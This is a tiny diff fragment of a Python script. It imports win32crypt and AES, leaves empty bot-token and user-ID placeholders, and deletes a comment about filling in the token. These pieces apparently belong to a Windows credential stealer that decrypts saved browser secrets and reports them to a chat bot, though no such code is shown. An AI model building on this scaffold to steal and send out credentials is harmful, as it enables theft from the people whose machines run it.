@@ -15,7 +15,7 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import sys
 
-# Replace with your bot token
+
 BOT_TOKEN = ""
 USER_ID = 
 
